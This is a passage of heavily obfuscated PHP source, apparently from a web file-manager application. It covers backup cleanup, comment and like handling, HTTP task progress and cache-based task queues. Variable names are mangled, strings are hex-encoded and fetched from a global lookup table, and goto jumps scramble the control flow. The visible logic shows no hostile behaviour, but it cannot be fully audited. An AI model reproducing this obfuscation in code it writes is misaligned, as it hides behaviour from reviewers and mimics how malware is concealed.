Task::kill($Ò”±ïËî[812]); $ïø £ƒ = $³™¿ÔÓ‰[$Ò”±ïËî[32]]; $ŸÆ—ıˆ = TEMP_FILES . $Ò”±ïËî[781] . $ïø £ƒ . $Ò”±ïËî[8]; IO::remove($ŸÆ—ıˆ, !1); return $this->remove($‘…°±Íı); } public function remove($ŠìüÉŸû) { $²ê¦ñõ = $this->listData($ŠìüÉŸû); if (!$²ê¦ñõ) { return !0; } return $this->backupRemove($²ê¦ñõ); } private function backupRemove($ŞŸ‚Ö‹ç) { parent::remove($ŞŸ‚Ö‹ç[$_SERVER[„Ç©ñÎ©][408]]); $§Œ¥ôÊì = $this->backupPath($ŞŸ‚Ö‹ç); IO::remove($§Œ¥ôÊì, !1); return !0; } private function backupPath($Æ–çı) { $ê«”£ø =& $_SERVER[„Ç©ñÎ©]; $ãúÁ‚Œ = $Æ–çı[$ê«”£ø[32]]; $Ç’Î·…ª = Model($ê«”£ø[773])->get($ê«”£ø[774]); $ì© û = substr(md5($ê«”£ø[775] . $Ç’Î·…ª . $ãúÁ‚Œ), 0, 8); return "\173\x69\157\72{$Æ–çı[$ê«”£ø[755]]}\x7d\x2f\x64\x61\x74\x61\142\x61\163\145\57\x62\141\143\x6b\x75\x70\57" . $ãúÁ‚Œ . $ê«”£ø[11] . $ì© û; } public function start() { $¥«¯¼‹ =& $_SERVER[„Ç©ñÎ©]; if ($GLOBALS[$¥«¯¼‹[6]][$¥«¯¼‹[99]][$¥«¯¼‹[1855]] != $¥«¯¼‹[98]) { return !0; } $¯ÈÔü¥ = $this->config(); if (!$¯ÈÔü¥ || $¯ÈÔü¥[$¥«¯¼‹[1625]] != $¥«¯¼‹[98]) { return !1; } $Öºš¡©Ã = $this->process(); foreach ($Öºš¡©Ã as $…°¨óÈ¸) { if ($…°¨óÈ¸) { return Task::restart($…°¨óÈ¸[$¥«¯¼‹[408]]); } } $êÕ—»Ù· = new Backup(); $Éßƒ¶Ú… = $êÕ—»Ù·->db(); if ($Éßƒ¶Ú…) { $Éßƒ¶Ú… = $êÕ—»Ù·->dbFile(); if ($Éßƒ¶Ú… && $¯ÈÔü¥[$¥«¯¼‹[758]] == $¥«¯¼‹[207]) { $Éßƒ¶Ú… = $êÕ—»Ù·->file(); } } Backup::set(array($¥«¯¼‹[753] => 1, $¥«¯¼‹[506] => time())); return !0; } public function process() { $€ÅŞ€° =& $_SERVER[„Ç©ñÎ©]; $şû¹¡Ôé = array($€ÅŞ€°[761] => Task::get($€ÅŞ€°[782]), $€ÅŞ€°[765] => Task::get($€ÅŞ€°[803]), $€ÅŞ€°[209] => Task::get($€ÅŞ€°[812])); $¯£¥øÊ¿ = !1; foreach ($şû¹¡Ôé as &$ß€Š´½¾) { if ($¯£¥øÊ¿) { $ß€Š´½¾ = !1; continue; } if ($ß€Š´½¾) { $¼€ˆÙôƒ = intval(_get($ß€Š´½¾, $€ÅŞ€°[1660], 0)); if (time() - $¼€ˆÙôƒ > 7200) { Task::kill($ß€Š´½¾[$€ÅŞ€°[408]]); $¯£¥øÊ¿ = !0; $ß€Š´½¾ = !1; } } } return $şû¹¡Ôé; } public function restore() { $©„‰ù‘ú =& $_SERVER[„Ç©ñÎ©]; ActionCall($©„‰ù‘ú[1059], !0, 1); ActionCall($©„‰ù‘ú[1059], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\145\x6e\164"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\x61\x6d\x65" => "\x63\157\155\155\x65\156\164\137\155\x65\164\x61", "\x6d\145\x74\x61\106\x69\145\154\x64" => "\x63\157\155\x6d\145\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ù—şİŒ„) { $È–«…› =& $_SERVER[„Ç©ñÎ©]; if ($ù—şİŒ„[$È–«…›[1856]]) { $ŒŸÒÍğ = $this->where(array($È–«…›[1857] => $ù—şİŒ„[$È–«…›[1856]]))->find(); if (!$ŒŸÒÍğ || $ŒŸÒÍğ[$È–«…›[420]] != $ù—şİŒ„[$È–«…›[420]] || $ŒŸÒÍğ[$È–«…›[514]] != $ù—şİŒ„[$È–«…›[514]]) { return !1; } $this->where(array($È–«…›[1857] => $ù—şİŒ„[$È–«…›[1856]]))->setAdd($È–«…›[1858], 1); } $ù—şİŒ„[$È–«…›[1859]] = 0; $ù—şİŒ„[$È–«…›[1858]] = 0; $ù—şİŒ„[$È–«…›[753]] = 1; return $this->add($ù—şİŒ„); } public function commentCount($Ä„Ï÷¾, $“İÜª¥Ì, $½½ï“ = false) { $Ü¹Šƒ =& $_SERVER[„Ç©ñÎ©]; if (!$Ä„Ï÷¾) { return array(); } if (is_string($Ä„Ï÷¾) || is_int($Ä„Ï÷¾)) { $Ä„Ï÷¾ = array($Ä„Ï÷¾); } $õ©ª©³õ = array($Ü¹Šƒ[514], $Ü¹Šƒ[1860] => $Ü¹Šƒ[509]); $ó ¢„ö¿ = array($Ü¹Šƒ[514] => array($Ü¹Šƒ[7], $Ä„Ï÷¾), $Ü¹Šƒ[420] => $“İÜª¥Ì); if ($½½ï“) { $ó ¢„ö¿[$Ü¹Šƒ[1655]] = $½½ï“; } $Ïö€¶» = $this->field($õ©ª©³õ)->where($ó ¢„ö¿)->group($Ü¹Šƒ[514])->select(); return array_to_keyvalue($Ïö€¶», $Ü¹Šƒ[514], $Ü¹Šƒ[509]); } public function starTarget($À‡ööò, $âÆÇˆ‡®) { $Îô¨û›Û =& $_SERVER[„Ç©ñÎ©]; $ºÎ¿äåÒ = $À‡ööò + self::TYPE_STAR_OFFSET; $¯ÎÉ‹Êı = array($Îô¨û›Û[1655] => USER_ID, $Îô¨û›Û[420] => $ºÎ¿äåÒ, $Îô¨û›Û[514] => $âÆÇˆ‡®); $µÉ–æ–‹ = $this->where($¯ÎÉ‹Êı)->find(); if ($µÉ–æ–‹) { return $this->where(array($Îô¨û›Û[408] => $µÉ–æ–‹[$Îô¨û›Û[408]]))->delete(); } $Ã×€˜äü = array($Îô¨û›Û[1856] => 0, $Îô¨û›Û[1655] => USER_ID, $Îô¨û›Û[753] => 1, $Îô¨û›Û[758] => $Îô¨û›Û[12], $Îô¨û›Û[420] => $ºÎ¿äåÒ, $Îô¨û›Û[514] => $âÆÇˆ‡®, $Îô¨û›Û[1859] => 0, $Îô¨û›Û[1858] => 0); return $this->add($Ã×€˜äü); } public function starTargetCount($Çßµ€¹, $€¤‡šçº) { $±–ï¦ú =& $_SERVER[„Ç©ñÎ©]; $ã£äÒö± = $€¤‡šçº + self::TYPE_STAR_OFFSET; $ÎŒÜ«çÍ = $this->commentCount($Çßµ€¹, $ã£äÒö±); $­ÃšÇ›º = $this->commentCount($Çßµ€¹, $ã£äÒö±, USER_ID); return array($±–ï¦ú[1861] => $ÎŒÜ«çÍ, $±–ï¦ú[1862] => $­ÃšÇ›º); } public function starTargetUserList($ñü¦ƒ±û, $ëàş£”) { $ßœ½úç =& $_SERVER[„Ç©ñÎ©]; $¢¾®×ª´ = $ñü¦ƒ±û + self::TYPE_STAR_OFFSET; $“†¿¹™Í = array($ßœ½úç[514] => $ëàş£”, $ßœ½úç[420] => $¢¾®×ª´); $Ïòİ£©É = $this->where($“†¿¹™Í)->count(); $ş•çÇğ = array($ßœ½úç[264] => $Ïòİ£©É, $ßœ½úç[1863] => array()); if (!$Ïòİ£©É) { return $ş•çÇğ; } $Ïâ¾»£¶ = $this->field($ßœ½úç[1655])->where($“†¿¹™Í)->limit(500)->select(); $Ïâ¾»£¶ = array_to_keyvalue($Ïâ¾»£¶, $ßœ½úç[12], $ßœ½úç[1655]); $ş•çÇğ[$ßœ½úç[1863]] = Model($ßœ½úç[522])->userListInfo($Ïâ¾»£¶); return $ş•çÇğ; } public function prasiseUserList($à“ ˜‰) { $ÕÀ’­÷” =& $_SERVER[„Ç©ñÎ©]; $šåÂëø = array($ÕÀ’­÷”[1864] => $à“ ˜‰); $·Åµ„ü° = $this->where($šåÂëø)->find(); $ö™¾ŠÂª = _get($·Åµ„ü°, $ÕÀ’­÷”[1859], 0); $ÊÉà¹Ûõ = array($ÕÀ’­÷”[264] => $ö™¾ŠÂª, $ÕÀ’­÷”[1863] => array()); if (!$ö™¾ŠÂª) { return $ÊÉà¹Ûõ; } $öÚ²Ü¼ß = Model($ÕÀ’­÷”[1865])->field($ÕÀ’­÷”[1655])->where($šåÂëø)->limit(500)->select(); $öÚ²Ü¼ß = array_to_keyvalue($öÚ²Ü¼ß, $ÕÀ’­÷”[12], $ÕÀ’­÷”[1655]); $ÊÉà¹Ûõ[$ÕÀ’­÷”[1863]] = Model($ÕÀ’­÷”[522])->userListInfo($öÚ²Ü¼ß); return $ÊÉà¹Ûõ; } public function remove($ÆØ­’™Ş) { $«òó„Óì =& $_SERVER[„Ç©ñÎ©]; $ë­è‡Ô¬ = array($«òó„Óì[1857] => $ÆØ­’™Ş); $«ü¶ÚÚ = $this->where($ë­è‡Ô¬)->find(); if ($«ü¶ÚÚ[$«òó„Óì[1856]]) { $this->where(array($«òó„Óì[1857] => $«ü¶ÚÚ[$«òó„Óì[1856]]))->setAdd($«òó„Óì[1858], -1); } return $this->where($ë­è‡Ô¬)->delete(); } public function edit($µîûù¥Í, $Äò°Ä¿œ) { $¹‰½êä =& $_SERVER[„Ç©ñÎ©]; $Ê†‘Ò ¶ = array($¹‰½êä[1857] => $µîûù¥Í); return $this->where($Ê†‘Ò ¶)->save(array($¹‰½êä[1866] => $Äò°Ä¿œ)); } public function prasise($ÚÆ€°ë) { $‚èªÊÛõ =& $_SERVER[„Ç©ñÎ©]; $ÊØ–âÖÜ = Model($‚èªÊÛõ[1867]); $ûº èÚã = array($‚èªÊÛõ[1857] => $ÚÆ€°ë, $‚èªÊÛõ[1646] => USER_ID); $“Û¾¯íå = $ÊØ–âÖÜ->where($ûº èÚã)->find(); if (!$“Û¾¯íå) { $ÊØ–âÖÜ->add($ûº èÚã); $ëğÅîô = $this->where(array($‚èªÊÛõ[1857] => $ÚÆ€°ë))->setAdd($‚èªÊÛõ[1859], 1); } else { $ÊØ–âÖÜ->where($ûº èÚã)->delete(); $ëğÅîô = $this->where(array($‚èªÊÛõ[1857] => $ÚÆ€°ë))->setAdd($‚èªÊÛõ[1859], -1); } return $ëğÅîô; } public function targetInfo($æ¸ş¿İö, $¾´äº…) { $¿Á’¤ú =& $_SERVER[„Ç©ñÎ©]; $â™²ÙÂ = array($¿Á’¤ú[595] => $æ¸ş¿İö, $¿Á’¤ú[596] => $¾´äº…); $´ÁË²ı² = $this->where($â™²ÙÂ)->count(); $ñ€äà§ = "\x52\111\x47\x48\124\40\x4a\117\x49\116\x20{$this->tablePrefix}\143\x6f\x6d\155\x65\x6e\164\137\160\162\x61\x69\x73\145\40\163\164\x61\x72\x20\157\x6e\40\143\157\x6d\x6d\145\156\x74\56\x63\157\x6d\x6d\x65\156\164\x49\104\40\75\40\163\164\x61\x72\56\x63\x6f\155\x6d\x65\156\164\111\104"; $õ­¯şñû = $this->alias($¿Á’¤ú[363])->where($â™²ÙÂ)->join($ñ€äà§, $¿Á’¤ú[1868])->count(); $ƒ¥Şì¨ = array($¿Á’¤ú[1869] => $´ÁË²ı², $¿Á’¤ú[1870] => $õ­¯şñû); return $ƒ¥Şì¨; } public function listData($ÉÊ¼±Á) { $”Â±¡‰Û =& $_SERVER[„Ç©ñÎ©]; if (isset($ÉÊ¼±Á[$”Â±¡‰Û[1871]])) { if ($ÉÊ¼±Á[$”Â±¡‰Û[1871]]) { $ÉÊ¼±Á[$”Â±¡‰Û[1864]] = array($”Â±¡‰Û[1013], intval($ÉÊ¼±Á[$”Â±¡‰Û[1871]])); } unset($ÉÊ¼±Á[$”Â±¡‰Û[1871]]); } if (isset($ÉÊ¼±Á[$”Â±¡‰Û[1872]])) { if ($ÉÊ¼±Á[$”Â±¡‰Û[1872]]) { $ÉÊ¼±Á[$”Â±¡‰Û[1864]] = array($”Â±¡‰Û[1010], intval($ÉÊ¼±Á[$”Â±¡‰Û[1872]])); } unset($ÉÊ¼±Á[$”Â±¡‰Û[1872]]); } return $this->_listData($ÉÊ¼±Á); } private function _listData($–¤§œ°) { $ÊÈóŒ§¬ =& $_SERVER[„Ç©ñÎ©]; $„¨Á‡œ = $this->where($–¤§œ°)->_makeOrder()->selectPage(100); $this->_listAppendParent($„¨Á‡œ[$ÊÈóŒ§¬[378]]); $this->_listAppendUser($„¨Á‡œ[$ÊÈóŒ§¬[378]]); $this->_listAppendMeta($„¨Á‡œ[$ÊÈóŒ§¬[378]]); return $„¨Á‡œ; } private function _makeOrder() { $à†±Ìµş =& $_SERVER[„Ç©ñÎ©]; $å¬öú›Û = array($à†±Ìµş[1859], $à†±Ìµş[1858], $à†±Ìµş[210]); $ò•±÷Âî = Input::get($à†±Ìµş[466], $à†±Ìµş[7], $à†±Ìµş[432], $å¬öú›Û); $ÉÅš¹‘ò = Input::get($à†±Ìµş[467], $à†±Ìµş[7], $à†±Ìµş[1648], array($à†±Ìµş[1873], $à†±Ìµş[462])); $ÉÁ¨¥Ê® = $ò•±÷Âî . $à†±Ìµş[53] . $ÉÅš¹‘ò; return $this->order($ÉÁ¨¥Ê®); } private function _listAppendParent(&$Ä¢Œö­‘) { $æåé¢õ¿ =& $_SERVER[„Ç©ñÎ©]; $¨§¶şÙ” = array_unique(array_to_keyvalue($Ä¢Œö­‘, $æåé¢õ¿[12], $æåé¢õ¿[1856])); $¨§¶şÙ” = array_remove_value($¨§¶şÙ”, $æåé¢õ¿[207]); if (!$¨§¶şÙ”) { return; } $ï¯”²œø = $this->where(array($æåé¢õ¿[1857] => array($æåé¢õ¿[7], $¨§¶şÙ”)))->select(); $ï¯”²œø = array_to_keyvalue($ï¯”²œø, $æåé¢õ¿[1864]); foreach ($Ä¢Œö­‘ as &$Òºö«İ›) { if (isset($ï¯”²œø[$Òºö«İ›[$æåé¢õ¿[1856]]])) { $Òºö«İ›[$æåé¢õ¿[1874]] = $ï¯”²œø[$Òºö«İ›[$æåé¢õ¿[1856]]]; } } unset($Òºö«İ›); } private function _listAppendUser(&$÷Ü±›’ã) { $Ãâä¨û =& $_SERVER[„Ç©ñÎ©]; $şĞÅ¯Ø = array_unique(array_to_keyvalue($÷Ü±›’ã, $Ãâä¨û[12], $Ãâä¨û[1655])); $şĞÅ¯Ø = array_remove_value($şĞÅ¯Ø, $Ãâä¨û[207]); if (count($şĞÅ¯Ø) == 0) { return; } foreach ($÷Ü±›’ã as $†ÈÛÊ¨ü) { if (isset($†ÈÛÊ¨ü[$Ãâä¨û[1874]])) { $şĞÅ¯Ø[] = $†ÈÛÊ¨ü[$Ãâä¨û[1874]][$Ãâä¨û[1655]]; } } $¤Éšù÷ = Model($Ãâä¨û[544])->userListInfo($şĞÅ¯Ø); foreach ($÷Ü±›’ã as &$†ÈÛÊ¨ü) { $†ÈÛÊ¨ü[$Ãâä¨û[609]] = $¤Éšù÷[$†ÈÛÊ¨ü[$Ãâä¨û[1655]]]; if (isset($†ÈÛÊ¨ü[$Ãâä¨û[1874]])) { $†ÈÛÊ¨ü[$Ãâä¨û[1874]][$Ãâä¨û[609]] = $¤Éšù÷[$†ÈÛÊ¨ü[$Ãâä¨û[1874]][$Ãâä¨û[1655]]]; } } unset($†ÈÛÊ¨ü); } private function _listAppendMeta(&$áÛ“´¢Ê) { $ÎÆğÜ»• =& $_SERVER[„Ç©ñÎ©]; $Ğ˜ = array_unique(array_to_keyvalue($áÛ“´¢Ê, $ÎÆğÜ»•[12], $ÎÆğÜ»•[1864])); $Ğ˜ = array_remove_value($Ğ˜, $ÎÆğÜ»•[207]); if (!$Ğ˜) { return; } foreach ($áÛ“´¢Ê as $ûáöÅ±) { if (isset($ûáöÅ±[$ÎÆğÜ»•[1874]])) { $Ğ˜[] = $ûáöÅ±[$ÎÆğÜ»•[1874]][$ÎÆğÜ»•[1864]]; } } $â‚êšìĞ = $this->metaList($Ğ˜); if (!$â‚êšìĞ) { return !1; } foreach ($áÛ“´¢Ê as &$ûáöÅ±) { $ûáöÅ±[$ÎÆğÜ»•[475]] = $â‚êšìĞ[$ûáöÅ±[$ÎÆğÜ»•[1864]]]; if (isset($ûáöÅ±[$ÎÆğÜ»•[1874]])) { $ûáöÅ±[$ÎÆğÜ»•[1874]][$ÎÆğÜ»•[475]] = $â‚êšìĞ[$ûáöÅ±[$ÎÆğÜ»•[1874]][$ÎÆğÜ»•[1864]]]; } } unset($ûáöÅ±); } private function metaList($™›ˆ›ñÖ) { $Œ¾¬Ãæë =& $_SERVER[„Ç©ñÎ©]; if (!$™›ˆ›ñÖ) { return array(); } $Öä®ä• = array($Œ¾¬Ãæë[1864] => array($Œ¾¬Ãæë[7], $™›ˆ›ñÖ)); $òõŞñ = Model($Œ¾¬Ãæë[1875])->where($Öä®ä•)->select(); $òõŞñ = array_to_keyvalue_group($òõŞñ, $Œ¾¬Ãæë[1864]); foreach ($òõŞñ as $¸Ä€ŒäÊ => $ºŠŞäë·) { $›å°“è¡ = array(); foreach ($ºŠŞäë· as $û£«È°) { $›å°“è¡[$û£«È°[$Œ¾¬Ãæë[104]]] = $û£«È°[$Œ¾¬Ãæë[383]]; } $òõŞñ[$¸Ä€ŒäÊ] = $›å°“è¡; } return $òõŞñ ? $òõŞñ : array(); } } goto Cäİß°‘¬½; b—ôÆƒ¼»¿: class TaskHttp extends Task { protected function startAfter() { $Şä³ğ¾Á =& $_SERVER[„Ç©ñÎ©]; $àå•ËË =& $this->task; $àå•ËË[$Şä³ğ¾Á[1730]] = 1; Hook::bind($Şä³ğ¾Á[1698], array($this, $Şä³ğ¾Á[1731])); Hook::bind($Şä³ğ¾Á[1700], array($this, $Şä³ğ¾Á[1732])); Hook::bind($Şä³ğ¾Á[1702], array($this, $Şä³ğ¾Á[1733])); } protected function endAfter() { $ü“ö¤êº =& $_SERVER[„Ç©ñÎ©]; Hook::unbind($ü“ö¤êº[1698], array($this, $ü“ö¤êº[1731])); Hook::unbind($ü“ö¤êº[1700], array($this, $ü“ö¤êº[1732])); Hook::unbind($ü“ö¤êº[1702], array($this, $ü“ö¤êº[1733])); } public function progressStart($®Ì…ÃÑ”) { $±§ıÈ¡ =& $_SERVER[„Ç©ñÎ©]; $ã²ûï¤ = curl_getinfo($®Ì…ÃÑ”); self::log($±§ıÈ¡[1734] . $ã²ûï¤[$±§ıÈ¡[316]]); self::valueSet($this->task[$±§ıÈ¡[408]], $this->task); } public function progressEnd($Ï˜òğû¶) { $¬û¨Ùá =& $_SERVER[„Ç©ñÎ©]; self::log($¬û¨Ùá[1735] . $this->task[$¬û¨Ùá[408]]); $this->end(); } public function progress($€İ¤âè¢, $Ú²Óğ, $ùµ„ç©º, $¨ØŠø¸, $”‰Òò´è) { $ş´õ³» =& $_SERVER[„Ç©ñÎ©]; $ÊØÍÕ  =& $this->task; if ($”‰Òò´è > 0) { $ÊØÍÕ [$ş´õ³»[789]] = $ÊØÍÕ [$ş´õ³»[789]] == 0 ? $¨ØŠø¸ : $ÊØÍÕ [$ş´õ³»[789]]; $ÊØÍÕ [$ş´õ³»[1656]] = $”‰Òò´è; } else { if ($ùµ„ç©º > 0) { $ÊØÍÕ [$ş´õ³»[789]] = $ÊØÍÕ [$ş´õ³»[789]] == 0 ? $Ú²Óğ : $ÊØÍÕ [$ş´õ³»[789]]; $ÊØÍÕ [$ş´õ³»[1656]] = $ùµ„ç©º; } } $this->update(); self::log("\160\x72\x6f\x67\162\x65\x73\163\x48\x74\164\160\72\x64\x6f\167\156\72{$ùµ„ç©º}\x2f{$Ú²Óğ}\x3b\40\165\160\x6c\157\x61\x64\x3a{$”‰Òò´è}\57{$¨ØŠø¸}\73"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\x6b\x51\165\145\x75\145\114\145\156\147\x74\150"; const QUEUE_DATA = "\x74\x61\x73\x6b\121\165\145\x75\x65\104\141\x74\141"; public static $listData = false; public static function initTask() { } public static function add($äé—»ÈÃ, $™œıÎ¡ = array(), $õÆæù°Û = '', $‹íËêâı = '') { $Üà˜ø¹¯ =& $_SERVER[„Ç©ñÎ©]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($‹íËêâı && array_find_by_field(self::$listData, $Üà˜ø¹¯[104], $‹íËêâı)) { return !0; } self::$listData[] = array($Üà˜ø¹¯[273] => $äé—»ÈÃ, $Üà˜ø¹¯[1736] => $™œıÎ¡, $Üà˜ø¹¯[462] => $õÆæù°Û, $Üà˜ø¹¯[104] => $‹íËêâı); return !0; } public static function addSubmit() { $›º‚ªáß =& $_SERVER[„Ç©ñÎ©]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($›º‚ªáß[1737] . json_encode_force(array_to_keyvalue(self::$listData, $›º‚ªáß[12], $›º‚ªáß[462])), $›º‚ªáß[1738]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($è—€˜á, $Ñî¡Á = array(), $ıé›‹ÍË = '', $·¾¾Áèï = '') { $úªşùµÎ =& $_SERVER[„Ç©ñÎ©]; if (self::count() >= self::MAX_LENGTH) { return !1; } $‚˜ãµ² = self::getAll(); if ($·¾¾Áèï && array_find_by_field($‚˜ãµ², $úªşùµÎ[104], $·¾¾Áèï)) { return !0; } $‚˜ãµ²[] = array($úªşùµÎ[273] => $è—€˜á, $úªşùµÎ[1736] => $Ñî¡Á, $úªşùµÎ[462] => $ıé›‹ÍË, $úªşùµÎ[104] => $·¾¾Áèï); write_log($úªşùµÎ[1737] . $ıé›‹ÍË, $úªşùµÎ[1738]); self::setAll($‚˜ãµ²); return !0; } public static function run() { $Ùæ±¹ÈË =& $_SERVER[„Ç©ñÎ©]; $²»ã®¸â = self::getAll(); $ Ê’ª›ı = array_shift($²»ã®¸â); if (!$ Ê’ª›ı) { return !1; } self::setAll($²»ã®¸â); $­Çû·›® = timeFloat(); try { Hook::apply($ Ê’ª›ı[$Ùæ±¹ÈË[273]], $ Ê’ª›ı[$Ùæ±¹ÈË[1736]]); } catch (Exception $È†àâ²Ş) { } $—ˆœÛó© = number_format(timeFloat() - $­Çû·›®, 3) . $Ùæ±¹ÈË[1671]; write_log($Ùæ±¹ÈË[1739] . $ Ê’ª›ı[$Ùæ±¹ÈË[462]] . $Ùæ±¹ÈË[1740] . $—ˆœÛó©, $Ùæ±¹ÈË[1738]); return !0; } public static function count() { $î¶ÁƒÅ“ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$î¶ÁƒÅ“) { return 0; } return intval($î¶ÁƒÅ“); } public static function getAll() { $ïªï±˜’ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ïªï±˜’) { return array(); } return $ïªï±˜’; } public static function setAll($šÆÁ•–Ÿ) { $ÁÀœÆªÉ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($šÆÁ•–Ÿ), $ÁÀœÆªÉ); Cache::set(self::QUEUE_DATA, $šÆÁ•–Ÿ, $ÁÀœÆªÉ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($õéÂÎ€•, $ö®İÔú² = 5.0) { if (!$õéÂÎ€•) { return; } $ªŒˆ»¨° = Cache::get($õéÂÎ€•); if (!$ªŒˆ»¨° || timeFloat() - floatVal($ªŒˆ»¨°) >= $ö®İÔú²) { Cache::set($õéÂÎ€•, timeFloat(), $ö®İÔú² * 10); return !0; } return !1; } public static function timeLimitCall($ÇÚ«‚ìÕ, $á œ¬ì, $ê¦¹¨ç¬, $ô‘ç…Ê‡ = 5.0) { $ìÃ Ô…Ä =& $_SERVER[„Ç©ñÎ©]; if (!$ÇÚ«‚ìÕ || !$á œ¬ì) { return; } self::$asyncAdd = !0; $ËÖ²“„ = $ìÃ Ô…Ä[1741]; $Åğ™óéº = Cache::get($ËÖ²“„, !0); $ÖÆ±‘¹¡ = array($ìÃ Ô…Ä[1742] => timeFloat(), $ìÃ Ô…Ä[1743] => timeFloat(), $ìÃ Ô…Ä[273] => $á œ¬ì, $ìÃ Ô…Ä[1736] => $ê¦¹¨ç¬, $ìÃ Ô…Ä[213] => $ô‘ç…Ê‡); if (is_array($Åğ™óéº[$ÇÚ«‚ìÕ])) { $ÖÆ±‘¹¡[$ìÃ Ô…Ä[1743]] = $Åğ™óéº[$ÇÚ«‚ìÕ][$ìÃ Ô…Ä[1743]]; } if (is_array($Åğ™óéº[$ÇÚ«‚ìÕ])) { if (timeFloat() - $Åğ™óéº[$ÇÚ«‚ìÕ][$ìÃ Ô…Ä[1742]] < $ÖÆ±‘¹¡[$ìÃ Ô…Ä[213]] * 0.3) { return; } $ÖÆ±‘¹¡[$ìÃ Ô…Ä[1743]] = $Åğ™óéº[$ÇÚ«‚ìÕ][$ìÃ Ô…Ä[1743]]; } $Åğ™óéº[$ÇÚ«‚ìÕ] = $ÖÆ±‘¹¡; Cache::set($ËÖ²“„, $Åğ™óéº, 60); Cache::removeMemory($ËÖ²“„); write_log($ìÃ Ô…Ä[1744] . $ÇÚ«‚ìÕ . $ìÃ Ô…Ä[81] . $á œ¬ì, $ìÃ Ô…Ä[1738]); } public static function timeLimitCallLoop() { $¦µº–Üá =& $_SERVER[„Ç©ñÎ©]; $ÓĞ‰’¬ğ = array($¦µº–Üá[1745]); $°‰†ŸÁ° = in_array(strtolower(ACTION), $ÓĞ‰’¬ğ); if (!$°‰†ŸÁ° && !self::$asyncAdd) { return; } $ßİ¥„‡ = $¦µº–Üá[1741]; $÷ş‚¨Òâ = Cache::get($ßİ¥„‡, !0); if (!$÷ş‚¨Òâ || count($÷ş‚¨Òâ) <= 0) { return; } $§´ø‘ñ‡ = !1; $Š‘š¦’Í = timeFloat(); $Ãú»¼é› = array(); foreach ($÷ş‚¨Òâ as $§†áÈ½ƒ => $ú’Ÿî–Æ) { if ($Š‘š¦’Í - $ú’Ÿî–Æ[$¦µº–Üá[1743]] > $ú’Ÿî–Æ[$¦µº–Üá[213]]) { $§´ø‘ñ‡ = !0; try { Hook::apply($ú’Ÿî–Æ[$¦µº–Üá[273]], $ú’Ÿî–Æ[$¦µº–Üá[1736]]); write_log($¦µº–Üá[1746] . $§†áÈ½ƒ . $¦µº–Üá[81] . $ú’Ÿî–Æ[$¦µº–Üá[273]] . $¦µº–Üá[1747] . ACTION, $¦µº–Üá[1738]); } catch (Exception $¦¹‹³äÛ) { } continue; } $Ãú»¼é›[$§†áÈ½ƒ] = $ú’Ÿî–Æ; } if (!$§´ø‘ñ‡) { return; } if (!$Ãú»¼é›) { return Cache::remove($ßİ¥„‡); } Cache::set($ßİ¥„‡, $Ãú»¼é›, 60); Cache::removeMemory($ßİ¥„‡); } public static function finished($ë¬ïß, $ìÚĞä˜Â) { $ò·÷Æ‹¿ =& $_SERVER[„Ç©ñÎ©]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ò·÷Æ‹¿[273] => $ë¬ïß, $ò·÷Æ‹¿[1736] => $ìÚĞä˜Â); } private static function finishedRun() { $å‚‚şëÎ =& $_SERVER[„Ç©ñÎ©]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ı§Ã²è) { try { Hook::apply($ı§Ã²è[$å‚‚şëÎ[273]], $ı§Ã²è[$å‚‚şëÎ[1736]]); } catch (Exception $í¦•“) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto B»Î“ÈÁÒ›; b‹µ„Ö”É: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($«÷ÉßÖÖ) { $İ©ò‚ë =& $_SERVER[„Ç©ñÎ©]; $¸®½‡é = Model($İ©ò‚ë[522])->where(array($İ©ò‚ë[1646] => $«÷ÉßÖÖ))->find(); $”íÎ± = $this->_mkdirRoot(SourceModel::TYPE_USER, $«÷ÉßÖÖ, $¸®½‡é[$İ©ò‚ë[32]]); $this->userDesktopAdd($”íÎ±); return $”íÎ±; } public function userDesktopAdd($„†çÔİ) { $„×—£Ï =& $_SERVER[„Ç©ñÎ©]; $™ô™’ä = LNG($„×—£Ï[2095]); $àĞü‰ŞÑ = $this->mkdir($„†çÔİ, $™ô™’ä); $this->metaSet($àĞü‰ŞÑ, $„×—£Ï[2096], $„×—£Ï[98]); $this->metaSet($„†çÔİ, $„×—£Ï[2097], $àĞü‰ŞÑ); } public function userPathSafeAdd($ÉÙÚ¦Ì) { $Â÷¢ä‚Ä =& $_SERVER[„Ç©ñÎ©]; $£‡ßõ–‹ = Model($Â÷¢ä‚Ä[522])->getInfoFull($ÉÙÚ¦Ì); if (!$£‡ßõ–‹) { return !1; } if (_get($£‡ßõ–‹, $Â÷¢ä‚Ä[545])) { return $£‡ßõ–‹[$Â÷¢ä‚Ä[475]][$Â÷¢ä‚Ä[2098]]; } $’³ì“Œ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÉÙÚ¦Ì, $Â÷¢ä‚Ä[2099], $Â÷¢ä‚Ä[442]); Model($Â÷¢ä‚Ä[522])->metaSet($ÉÙÚ¦Ì, $Â÷¢ä‚Ä[2098], $’³ì“Œ); $this->metaSet($’³ì“Œ, $Â÷¢ä‚Ä[2100], $ÉÙÚ¦Ì); return $’³ì“Œ; } public function groupRootAdd($ƒ¼¬‡Š) { $Ò›ôéøµ =& 